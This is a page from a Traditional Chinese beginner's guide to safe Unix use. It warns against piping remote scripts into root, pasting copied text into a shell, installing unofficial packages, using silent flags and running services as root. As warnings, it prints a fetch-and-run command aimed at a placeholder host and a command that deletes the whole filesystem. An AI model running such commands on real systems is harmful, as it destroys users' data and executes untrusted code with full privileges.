<!DOCTYPE HTML>

<html class="sidebar-visible no-js light" lang="zh-Hant">
<head>
<!-- Book generated using mdBook -->
<meta charset="utf-8"/>
<title>網上教程不會告訴你的類 Unix 使用注意事項 - privacy.noarch</title>
<!-- Custom HTML head -->
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="一本面向新手的隱私教程" name="description"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<meta content="#ffffff" name="theme-color">
<link href="../../favicon.png" rel="shortcut icon"/>
<link href="../../css/variables.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<noscript><link href="../../css/variables.css" rel="stylesheet"/></noscript>
<link href="../../css/general.css" rel="stylesheet"/>
<link href="../../css/chrome.css" rel="stylesheet"/>
<!-- Font Awesome 5.13 free content -->
<link href="../../FontAwesome/css/all.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<link href="../../FontAwesome/css/v4-shims.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<noscript>
<link href="../../FontAwesome/css/all.css" rel="stylesheet"/>
<link href="../../FontAwesome/css/v4-shims.css" rel="stylesheet"/>
</noscript>
<!-- Fonts -->
<!-- Highlight.js Stylesheets -->
<link href="../../highlight.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<link href="../../tomorrow-night.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<link href="../../ayu-highlight.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<noscript>
<link href="../../highlight.css" rel="stylesheet"/>
<link href="../../tomorrow-night.css" rel="stylesheet"/>
<link href="../../ayu-highlight.css" rel="stylesheet"/>
</noscript>
<!-- Custom theme stylesheets -->
<link href="../../sidebar.css" media="print" onload="this.media='all'" rel="stylesheet"/>
<noscript><link href="../../sidebar.css" rel="stylesheet"/></noscript>
</meta></head>
<body>
<!-- Provide site root to javascript -->
<script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>
<!-- Work around some values being stored in localStorage wrapped in quotes -->
<script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>
<!-- Set the theme before any content is loaded, prevents flash -->
<script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>
<!-- Hide / unhide sidebar before it is displayed -->
<script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>
<nav aria-label="Table of contents" class="sidebar" id="sidebar">
<div class="sidebar-scrollbox">
<ol class="chapter"><li class="chapter-item expanded affix"><a href="../../index.html">privacy.noarch</a></li><li class="chapter-item expanded affix"><a href="../../SUMMARY.html">目錄</a></li><li class="chapter-item expanded affix"><div>前言</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">1.</strong> 在開始前</div></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Fundamentals/BasicOfTheBasics.html"><strong aria-hidden="true">1.1.</strong> 常見錯誤集合：線上安全基本原則</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">2.</strong> 從可信的來源安裝軟體</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">2.1.</strong> [Android] F-Droid</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">2.2.</strong> [Android] Aurora Store</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">3.</strong> 安全地使用瀏覽器上網</div></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Browsers/Bromite/Bromite.html"><strong aria-hidden="true">3.1.</strong> [Android] Bromite</a></li><li class="chapter-item expanded"><div><strong aria-hidden="true">3.2.</strong> [Desktop/All] Firefox</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">3.2.1.</strong> 使用外掛來增強瀏覽體驗 ^</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">3.3.</strong> [Desktop/All]Tor Browser ^</div></li></ol></li><li class="chapter-item expanded"><a href="../../Input/Input.html"><strong aria-hidden="true">4.</strong> 自由打字，打字自由</a></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Input/NoNetworkAccess/NoNetworkAccess.html"><strong aria-hidden="true">4.1.</strong> [Android] 禁止輸入法聯網</a></li><li class="chapter-item expanded"><div><strong aria-hidden="true">4.2.</strong> 同文輸入法 (TRIME) ^</div></li></ol></li><li class="chapter-item expanded"><a href="../../Passwords/Passwords.html"><strong aria-hidden="true">5.</strong> 帳號安全：保護，隔離，整理</a></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Passwords/PasswordManagers.html"><strong aria-hidden="true">5.1.</strong> 讓密碼管理器幫你記住密碼</a></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">5.1.1.</strong> [Android] Bitwarden</div></li><li class="chapter-item expanded"><a href="../../Passwords/BitwardenWeb/BitwardenWeb.html"><strong aria-hidden="true">5.1.2.</strong> [Web] Bitwarden</a></li><li class="chapter-item expanded"><div><strong aria-hidden="true">5.1.3.</strong> [Desktop/All] KeePassXC ^</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">5.2.</strong> 二步驗證 - 增強帳號安全</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">5.2.1.</strong> [Android] andOTP</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">5.2.2.</strong> [Desktop/All] KeePassXC 的二步驗證功能</div></li></ol></li></ol></li><li class="chapter-item expanded"><a href="../../WallBreak/WallBreak.html"><strong aria-hidden="true">6.</strong> 突破網路長城</a></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">6.1.</strong> 代理提供商</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">6.2.</strong> 代理工具 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">6.2.1.</strong> V2Ray</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">6.2.2.</strong> Trojan</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">6.2.3.</strong> Shadowsocks*</div></li></ol></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">7.</strong> 在享受自由言論之前：“分裂人格”的魅力</div></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Identities/iYP_DID/iYP_DID.html"><strong aria-hidden="true">7.1.</strong> [轉載] 分身術完整指南：妥善管理您的線上身份並獲得安全的方法</a></li><li class="chapter-item expanded"><a href="../../Identities/WorldIsMine/WorldIsMine.html"><strong aria-hidden="true">7.2.</strong> [轉載] 一個網友的“個人網路身份整改方案”</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">8.</strong> 在網路圍牆外社交</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">8.1.</strong> 中心化</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">8.1.1.</strong> [All] Telegram</div></li><li class="chapter-item expanded"><a href="../../RTC/Signal/Signal.html"><strong aria-hidden="true">8.1.2.</strong> [Android] Signal</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">8.2.</strong> 去中心化 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">8.2.1.</strong> [Android/iOS] Matrix/Element</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">8.2.2.</strong> [Web] Matrix/Element</div></li></ol></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">9.</strong> 私密地傳送和接收郵件</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">9.1.</strong> 郵件提供商</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">9.1.1.</strong> [Web] ProtonMail</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">9.1.2.</strong> [Web] Tutanota</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">9.2.</strong> 郵件客戶端 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">9.2.1.</strong> [Android] K-9 Mail</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">9.2.2.</strong> [Desktop/All] Thunderbird</div></li></ol></li></ol></li><li class="chapter-item expanded"><a href="../../Encryption/Encryption.html"><strong aria-hidden="true">10.</strong> 加密，加密一切</a></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Encryption/Pubkey/Pubkey.html"><strong aria-hidden="true">10.1.</strong> [翻譯] 公鑰加密簡介</a></li><li class="chapter-item expanded"><a href="../../Encryption/OpenKeychain/OpenKeychain.html"><strong aria-hidden="true">10.2.</strong> [Android] PGP: OpenKeychain</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">11.</strong> Android 玩機技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">11.1.</strong> 系統設定</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">11.2.</strong> “刷機”基礎</div></li><li><ol class="section"><li class="chapter-item expanded"><div><strong aria-hidden="true">11.2.1.</strong> 深入瞭解自己的裝置</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">11.2.2.</strong> 選擇第三方 ROM</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">11.3.</strong> Magisk</div></li><li class="chapter-item expanded"><div><strong aria-hidden="true">11.4.</strong> microG</div></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">12.</strong> Windows 玩機技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Tricks-Windows/VHD/VHD.html"><strong aria-hidden="true">12.1.</strong> 使用 VHD(X) 部署原生多系統 ^</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">13.</strong> 類 Unix 玩機技巧 ^</div></li><li><ol class="section"><li class="chapter-item expanded"><a class="active" href="../../Tricks-Unix/dos-donts/dos-donts.html"><strong aria-hidden="true">13.1.</strong> 網上教程不會告訴你的類 Unix 使用注意事項</a></li></ol></li><li class="chapter-item expanded"><div><strong aria-hidden="true">14.</strong> 番外</div></li><li><ol class="section"><li class="chapter-item expanded"><a href="../../Extras/flowers-p1/index.html"><strong aria-hidden="true">14.1.</strong> 在虛空中與 amitié 相遇：Void Linux 和 FLOWERS 四季的邂逅 上篇 ^</a></li></ol></li><li class="chapter-item expanded"><div>後記</div></li><li class="chapter-item expanded affix"><a href="../../CONTRIBUTING.html">反饋與貢獻</a></li></ol>
<!-- mods to the vanilla sidebar-->
<hr/>
<p>© 2020-2021 <code>privacy.noarch</code> project.</p>
<p><b>無廣告，無追蹤，無跨站請求，可退出的 CDN.</b> privacy.noarch 致力於維持網際網路該有的樣子。</p>
<p><a href="https://t.me/privacy_noarch" target="_blank"><img height="20" src="/images/badge-telegram.svg"/></a></p>
<p><a href="https://github.com/noarchwastaken/privacy" target="_blank"><img height="20" src="/images/badge-git.svg"/></a></p>
<p><a href="https://www.gnu.org/licenses/fdl-1.3.html" target="_blank"><img height="20" src="/images/badge-gfdl.svg"/></a></p>
</div>
<div class="sidebar-resize-handle" id="sidebar-resize-handle"></div>
</nav>
<div class="page-wrapper" id="page-wrapper">
<div class="page">
<div id="menu-bar-hover-placeholder"></div>
<div class="menu-bar sticky bordered" id="menu-bar">
<div class="left-buttons">
<button aria-controls="sidebar" aria-label="Toggle Table of Contents" class="icon-button" id="sidebar-toggle" title="Toggle Table of Contents" type="button">
<i class="fa fa-bars"></i>
</button>
<button aria-controls="theme-list" aria-expanded="false" aria-haspopup="true" aria-label="Change theme" class="icon-button" id="theme-toggle" title="Change theme" type="button">
<i class="fa fa-paint-brush"></i>
</button>
<ul aria-label="Themes" class="theme-popup" id="theme-list" role="menu">
<li role="none"><button class="theme" id="light" role="menuitem">Light (default)</button></li>
<li role="none"><button class="theme" id="rust" role="menuitem">Rust</button></li>
<li role="none"><button class="theme" id="coal" role="menuitem">Coal</button></li>
<li role="none"><button class="theme" id="navy" role="menuitem">Navy</button></li>
<li role="none"><button class="theme" id="ayu" role="menuitem">Ayu</button></li>
</ul>
</div>
<h1 class="menu-title">privacy.noarch</h1>
<div class="right-buttons">
<a aria-label="Switch between Simplified and Traditional Chinese" class="icon-button" onclick="
                        'use strict';

                        const CN_CLEAR = 'privacy.n0ar.ch';
                        const TW_CLEAR = 'privacy-tw.n0ar.ch';
                        const CN_TOR = 'fluffyvv5b7iztvxxpu23ylr3o7dxgcgszqx5eb7drk35jyzkrk5q2ad.onion';
                        const TW_TOR = 'tw.fluffyvv5b7iztvxxpu23ylr3o7dxgcgszqx5eb7drk35jyzkrk5q2ad.onion';

                        switch (window.location.hostname) {
                            case CN_CLEAR:
                                window.location.hostname = TW_CLEAR;
                                break;
                            case TW_CLEAR:
                                window.location.hostname = CN_CLEAR;
                                break;
                            case CN_TOR:
                                window.location.hostname = TW_TOR;
                                break;
                            case TW_TOR:
                                window.location.hostname = CN_TOR;
                                break;
                            default:
                                window.alert('Error determining current site language.\nI\'m either being served locally, or running as a mirror.\n\nIf you are running a mirror, please change the hostnames on line ~166 in theme/index.hbs.');
                                break;
                        }
                        " title="Switch between Simplified and Traditional Chinese">
<strong>簡/繁</strong>
</a>
<a aria-label="Git repository" href="https://github.com/noarchwastaken/privacy" title="Git repository">
<i class="fa fa-github" id="git-repository-button"></i>
</a>
</div>
</div>
<!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
<script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>
<div class="content" id="content">
<main>
<!-- Page table of contents -->
<div class="sidetoc"><nav class="pagetoc"></nav></div>
<h1 id="網上教程不會告訴你的類-unix-使用注意事項"><a class="header" href="#網上教程不會告訴你的類-unix-使用注意事項">網上教程不會告訴你的類 Unix 使用注意事項</a></h1>
<hr/>
<pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
</code></pre>
<p>上面的一行命令，你看著熟悉嗎？</p>
<p>noarch 現在告訴你，這個你將要執行的 <code>dolor.sh</code> 內容是這樣的：</p>
<pre><code>rm -rf / --no-preserve-root
</code></pre>
<p>如果你在使用 GNU/Linux 或 *BSD, 執行它會刪除你電腦上的所有資料，需要你耗費大量精力找回。</p>
<p>這類作業系統自由度極高，但也代表著人為損壞的門檻更低；因此你需要在使用時多加註意。</p>
<p>下面是 noarch 在數年 GNU/Linux 使用過程中總結出的 do's &amp; don'ts.</p>
<h2 id="不-執行未知指令碼"><a class="header" href="#不-執行未知指令碼"><em>不：</em> 執行未知指令碼</a></h2>
<p>我們再來看下開頭 noarch 提到的命令：</p>
<pre><code>$ curl https://lorem.ipsum/dolor.sh | sudo bash
</code></pre>
<p>它其中的管道符號 <code>|</code> 代表所有從 <code>curl</code> 輸出的內容均會被盲目地被 <code>sudo bash</code> 執行。</p>
<p>你可能會問，<em>那我是不是就不要執行指令碼了？</em></p>
<p>當然不是。前提是你<em>在執行指令碼之前瞭解自己在執行些什麼。</em> noarch 取這個使用管道符號執行指令碼的例子，還強調稽核指令碼的重要性。</p>
<p>noarch 建議你在執行任何指令碼之前，先下載下來粗略閱讀一遍，然後再給它可執行許可權執行。這樣你至少知道自己在執行什麼。</p>
<h3 id="你真的需要一鍵指令碼嗎"><a class="header" href="#你真的需要一鍵指令碼嗎">你真的需要一鍵指令碼嗎？</a></h3>
<p>noarch 的個人意見：<em>使用他人的一鍵指令碼，視覺化面板等不是學習 Unix 的好方法。</em></p>
<p>指令碼沒法覆蓋所有使用情況，不知道目標機器的硬體配置，因此往往只能取一個“剛好能執行”的配置。</p>
<p>例如，如果你使用一個指令碼配置 LNMP (Linux + Nginx + MySQL + PHP), 你的 Nginx 配置可能不會禁用不安全的 HTTP, 並且未啟用<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">嚴格傳輸安全</a>。</p>
<p>這讓你的網站暴露於 TLS 降級攻擊：一個過度簡單的描述就是中間人攻擊者攔截客戶端開始 HTTPS 通訊的請求，使得客戶端只使用 HTTP 訪問你的網站。攻擊者再可以由此竊取你使用者的帳號密碼，修改你網站的內容...</p>
<p>除了安全問題之外，忽略細節需要犧牲效能：因為<a href="https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/">安全問題</a>，眾多發行版的 Nginx 安裝都預設禁用 Gzip 壓縮。這會讓你的使用者和伺服器浪費許多寶貴的流量，並降低載入速度。如果你手動配置 Nginx 並願意瞭解更多技術細節，你就可以專門為靜態資源 (CSS, JS...) 啟用 Gzip.</p>
<p>Gzip 配置得當<a href="https://www.rootusers.com/gzip-vs-bzip2-vs-xz-performance-comparison/">能幫你省下超過 70% 的流量</a>！</p>
<h2 id="不-複製貼上進-shell"><a class="header" href="#不-複製貼上進-shell"><em>不：</em> 複製貼上進 shell</a></h2>
<p>你在瀏覽器內複製的東西不永遠是你想的那樣。</p>
<p>網站可以用 Javascript <a href="https://briantracy.xyz/writing/copy-paste-shell.html">劫持你的剪貼簿</a>，讓你複製與你選擇時完全不同的內容。</p>
<p>並且，你在貼上時，甚至不需要手動按回車執行指令：在大多數預設情況下，惡意剪貼簿劫持內的一個換行字元就足以讓命令在你貼上時就執行。</p>
<p>即使你是 <a href="https://ohmyz.sh/"><code>oh-my-zsh</code></a> 的使用者，啟用了 <a href="https://cirw.in/blog/bracketed-paste">bracked pasting</a>, 惡意程式碼也可以通過包含 bracketed pasting 字元來逃逸這個功能，就像眾多 SQL injection 一樣。</p>
<p>一些終端模擬器，例如 iTerm2, <code>gnome-terminal</code> 和 <code>Terminal.app</code> 會自動將 bracket 字元轉義，這樣你相對不怎麼需要擔心最後一點。</p>
<h3 id="貼上進-vim-也不安全"><a class="header" href="#貼上進-vim-也不安全">貼上進 <code>vim</code> 也不安全</a></h3>
<p>你可能以為 Vim 只是一個文字編輯器，你在其中貼上內容是安全的；</p>
<p>但惡意程式碼還可以利用 Vim 的巨集功能執行命令。<a href="https://github.com/dxa4481/Pastejacking">這是另一個 Demo</a>, 以及一些應對措施。</p>
<h3 id="那我如何科學地複製貼上"><a class="header" href="#那我如何科學地複製貼上">那我如何科學地複製貼上？</a></h3>
<p>最好的方案 - 不要複製貼上網際網路上的內容到 Shell 等允許執行指令的地方。</p>
<p>如果你實在要貼上，一個更基本的文字編輯器，例如 <code>gedit</code> 可能適合你的需求。</p>
<p>如果你願意接受一些代價，你也可以禁用瀏覽器的 Javascript 複製貼上功能：</p>
<p>以 Firefox 或 Tor 瀏覽器為例，去 <code>about:config</code> 裡禁用 <code>dom.allow_cut_copy</code>.</p>
<p>這會阻止所有 Javascript 引起的複製貼上行為，意味著例如 Google Docs 以及 mdBook <code>clipboard.js</code> 這些對 Javascript 剪貼簿的合法應用將會失效。</p>
<h2 id="不-安裝野包"><a class="header" href="#不-安裝野包"><em>不：</em> 安裝野包</a></h2>
<p>“野包”指除了發行版官方軟體源之外的軟體包。</p>
<p>例如，<a href="https://discord.com/">Discord</a> 是一個專有軟體，因違反許多發行版的規定而無法進入官方軟體源；而你獲得它的方法之一就是通過 Discord 官網下載它的 <code>.deb</code> 軟體包；這個來自 Discord 網站的軟體包就稱之為“野包”。</p>
<p>另一個例子是 <a href="https://docs.docker.com/engine/install/debian/"><code>docker-ce</code></a>, 它用來在老系統上執行最新版 Docker.</p>
<p>需要注意的是，Canonical 的 PPA, Arch Linux AUR 等都屬於“野包”。它們不受到發行版的穩定性/相容性保障。</p>
<p>這些“野包”為系統帶來了諸多威脅：</p>
<ul>
<li>
<p>為了最大化相容性，野包往往自己打包所有依賴庫，而這些依賴庫不隨系統更新。</p>
<ul>
<li>如果某個依賴出現安全問題，你將需要依靠軟體釋出者進行更新；</li>
</ul>
</li>
<li>
<p>除此之外，不帶軟體源的“野包”還完全無法自動更新；</p>
</li>
<li>
<p>如果野包使用系統依賴，那麼問題更大了：你在進行發行版大更新時，它們大概率會因為 ABI/API 變更集體罷工；</p>
<ul>
<li>如果野包註冊了服務開機自啟，它甚至可能會導致你的電腦完全無法開機；</li>
</ul>
</li>
<li>
<p>不明來源的包能像上述指令碼一樣在安裝時執行指令碼完全摧毀你的系統。</p>
</li>
</ul>
<h3 id="野包的替代"><a class="header" href="#野包的替代">野包的替代</a></h3>
<p>以上述 Discord 為例，你可以在 <a href="https://flathub.org/home">Flathub</a> 上找到<a href="https://flathub.org/apps/details/com.discordapp.Discord">它的 Flatpak 版</a>；這個 Flatpak 版雖然也打包所有依賴，但它在沙盒內執行，並且能夠被統一更新。</p>
<p>來自 Ubuntu 的 <a href="https://snapcraft.io/">Snap</a> 也提供了類似 Flatpak 的沙盒環境，讓你能夠更安全地執行專有軟體。</p>
<p>除了用於執行專有軟體以外，Flatpak 和 Snap 還提供許多軟體的更新版本；</p>
<p>例如在本文編寫時，Debian 10 提供 GIMP 2.10.8, 但你可以通過 Flatpak 執行 GIMP 2.10.22 或 GIMP 3 的最新測試版，而不用擔心它們突然損壞系統。</p>
<p>至於 <code>docker-ce</code>, 它在大多數情況下不必要；例如 Debian 就提供了 <a href="https://packages.debian.org/buster/docker.io"><code>docker.io</code></a>. 你將來還可以使用 <a href="https://packages.debian.org/bullseye/podman"><code>podman</code></a> 來代替 Docker, 並且 Podman 相比 Docker 不需要後臺守護程序。</p>
<h3 id="make-install"><a class="header" href="#make-install"><code>make install</code>?</a></h3>
<p>當你執行 <code>make install</code> 時，你在執行開發者給你的一個安裝指令碼；根據你 <code>./configure</code> 時配置的選項，它可能會將軟體安裝到 <code>/usr/local/</code>. 這樣還好，因為這個地方專屬於“野包”；</p>
<p>但是，類似於<a href="#%E4%B8%8D-%E8%BF%90%E8%A1%8C%E6%9C%AA%E7%9F%A5%E8%84%9A%E6%9C%AC">不執行未知指令碼</a>，請在 <code>make install</code> 前檢查 <code>Makefile</code>, 確保你能將它解除安裝乾淨。你也可以使用 <code>debuild</code> 來與 Makefile 互動，自己建立一個相對好一點（至少能被 <code>dpkg</code> 追蹤）的“野包”。</p>
<h3 id="別無選擇"><a class="header" href="#別無選擇">別無選擇？</a></h3>
<p>有意思的是，noarch 上面講到的“野包”之一就是安全執行野包的一個方法。</p>
<p>你可以使用 Podman 或 Docker 執行一個發行版容器，然後在容器裡安裝野包。任務完成後，把容器刪除即可。如果你需要更多安全性，虛擬機器也是一個好主意。</p>
<h2 id="不-使用靜默選項"><a class="header" href="#不-使用靜默選項"><em>不：</em> 使用靜默選項</a></h2>
<p><img alt="apt 自動刪除出現問題" loading="lazy" src="images/apt-disaster.png"/></p>
<p>圖源：<a href="https://t.me/k4yt3x">@k4yt3x</a></p>
<p>上圖是為什麼你不應該使用靜默選項的一個絕佳例子。圖中 @k4yt3x 嘗試使用 <code>apt full-upgrade</code> 升級系統，然而 <code>telegram-desktop</code> 卻與現有的 QT5 衝突，引出一串刪除包的動作。</p>
<p>如果他在這裡使用了 <code>-y</code> 來自動確認，整個 QT5 框架將會被解除安裝；如果他再懶一些，還使用了 <code>--autoremove --purge</code>, 後果將不堪設想。</p>
<h2 id="不-使用-root-登入"><a class="header" href="#不-使用-root-登入"><em>不：</em> 使用 <code>root</code> 登入</a></h2>
<p>一直使用 <code>root</code> 賬戶登入，除了嚴重安全問題之外，你還被暴露在手滑的風險下。</p>
<p>例如你想 <code>rm -rf ./*</code>, 卻多打了一個空格，變成了 <code>rm -rf . /*</code>, 這個操作不僅不會觸發 preserve-root, 並且後果與直接刪除 <code>/</code> 沒有什麼區別。</p>
<h3 id="不-root-執行服務"><a class="header" href="#不-root-執行服務"><em>不：</em> <code>root</code> 執行服務</a></h3>
<p>noarch 再舉一個例子：你使用 <a href="https://aria2.github.io/">aria2</a> 搭建了一個下載機。</p>
<p>你對安全並非完全不重視，使用了 ssh key 登入，並且限制了可以訪問 ssh 的 IP 地址。</p>
<p>但你犯了一個錯誤：你在 <code>root</code> 登入的情況下使用 <code>nohup</code> 在後臺執行 <code>aria2c</code>, 並且暴露了 RPC 埠。</p>
<p>在不利用任何 0day 的情況下，攻擊者只需要找出你的 aria2 RPC 金鑰（你為了方便，它多半是一個弱密碼），然後下載他的 ssh 公鑰到 <code>/root/.ssh/authorized_keys</code>, 這臺機器就是他的了。</p>
<p>noarch 推薦的使用方法是為 <code>aria2c</code> 建立一個專門，低許可權的使用者，然後將它以這個使用者執行；你還可以為它建立一個 <code>systemd</code> 服務，指定執行時的使用者和組，或者使用 <code>systemd</code> 的<a href="https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=">動態使用者</a>功能。</p>
<h3 id="不-nobody-執行服務"><a class="header" href="#不-nobody-執行服務"><em>不：</em> <code>nobody</code> 執行服務</a></h3>
<blockquote>
<p><i class="fas fa-check-circle"></i> 感謝 <a href="https://t.me/karuboniru">@Karuboniru</a> 的勘誤！</p>
</blockquote>
<p>你可能覺得，系統裡最低許可權的使用者是 <code>nobody</code>, 也確實有很多教程叫你把服務在 <code>nobody</code> 下執行。<em>那麼以後低許可權的程序都用 <code>nobody</code>?</em></p>
<p>很抱歉，這是一個誤導。noarch 在<a href="https://github.com/noarchwastaken/privacy/commit/707dfe884294a2667008c10359704264ba126e0a">本章第一版</a>時也犯了這個錯誤。</p>
<p>使用 <code>nobody</code> 執行服務，會使你的服務意外獲得其它在 <code>nobody</code> 下的資源。<code>nobody</code> 還被 Linux 核心<a href="https://fedoraproject.org/wiki/Changes/RenameNobodyUser">用來對映無法對映到當前名稱空間內的 UID</a>, 例如 NFS 使用的 32 位 UID.</p>
<h2 id="不-盲目跟隨教程"><a class="header" href="#不-盲目跟隨教程"><em>不：</em> 盲目跟隨“教程”</a></h2>
<p><img alt="錯誤指引" loading="lazy" src="images/bad-advice.jpg"/></p>
<p>圖源：<a href="https://t.me/ducksoft">@ducksoft</a></p>
<p>剛看完上一節<a href="#%E4%B8%8D-%E5%AE%89%E8%A3%85%E9%87%8E%E5%8C%85">不安裝野包</a>，你應該意識到上圖的行為像是自殺。它將 <code>rpm</code> 包強行安裝在基於 Debian 的發行版上，後果可想而知...</p>
<p>包括 noarch 在內，網際網路上的教程編者也經常犯錯誤，或者無法及時更新他們的教程。（就看上一節<a href="">不 <code>nobody</code> 執行服務</a>！）</p>
<p>盲目跟隨這些教程可能使你陷入死衚衕，使用一個已經被拋棄的配置，例如在 Nginx 上啟用 SSLv3. （永遠別嘗試在生產環境上這麼做！）</p>
<p>如果你覺得你在遵循的教程有點奇怪或過時，請閱讀 man pages.</p>
<h2 id="最好-閱讀-man-pages"><a class="header" href="#最好-閱讀-man-pages"><em>最好：</em> 閱讀 man pages</a></h2>
<p>說起 man pages, 它是學習類 Unix 系統的最好方法：軟體的官方文件通常就被打包為 man pages - 文件頁。</p>
<p>例如，noarch 要為自己搭建一個 <code>cgit</code> 視覺化，而我不知道如何配置 <code>cgitrc</code> (<code>cgit</code> 的配置檔案)。</p>
<p>這時 noarch 只需要執行 <code>man cgitrc</code>, 這個由 <code>cgit</code> 開發者寫的文件內就告訴了 noarch 這個配置檔案的格式，配置項以及它們的用途。比網上某個教程可靠得多！</p>
<p>閱讀 man pages 可能比盲目跟隨網上教程耗時長，但它絕對能給你省下後續解決問題的時間。</p>
<p>如果你是 *BSD 使用者，因為網際網路上幾乎沒有傻瓜式教程，閱讀 man pages 幾乎是你生活不可或缺的一部分。</p>
<h2 id="最好-定期備份"><a class="header" href="#最好-定期備份"><em>最好：</em> 定期備份</a></h2>
<p>如果你在 <code>privacy.noarch</code> 的 <a href="https://privacy.n0ar.ch/chat">Telegram 群</a>內活躍，你應該知道 noarch 使用 <a href="https://btrfs.wiki.kernel.org/index.php/Main_Page">Btrfs</a>.</p>
<p>Btrfs 的<a href="https://en.wikipedia.org/wiki/Copy-on-write">寫入時複製</a>特性為 noarch 的日常備份帶來了極大便利；並且它也多次在 noarch 搞壞系統時拉了我一把。</p>
<p>別急著轉換檔案系統到 Btrfs; noarch 想要傳達的資訊是，時常備份系統能在你玩脫時把你救回來。</p>
<p>無論是雲伺服器提供商的“快照”功能，還是簡單地複製 <code>home</code> 目錄，保留對你而言重要的資料是“不玩脫”重要的一環。</p>
<h2 id="最好-擁抱自由軟體"><a class="header" href="#最好-擁抱自由軟體"><em>最好：</em> 擁抱自由軟體</a></h2>
<p>執行著 GNU/Linux, 卻還在尋找執行 Microsoft Office, Adobe Photoshop, Discord 等專有軟體的方法？</p>
<p>這可能是現在的你，這也是曾經的 noarch.</p>
<p>在 GNU/Linux 或 *BSD 上執行專有軟體，專有軟體會將你作為“二等公民”對待。</p>
<p>這是因為他們根本不關心，或是很少關心這些使用者的體驗：2020 年，GNU/Linux 和 *BSD 的<a href="https://gs.statcounter.com/os-market-share/all/worldwide/2020">桌面市場佔有率加起來還不到 MacOS 的七分之一</a>。</p>
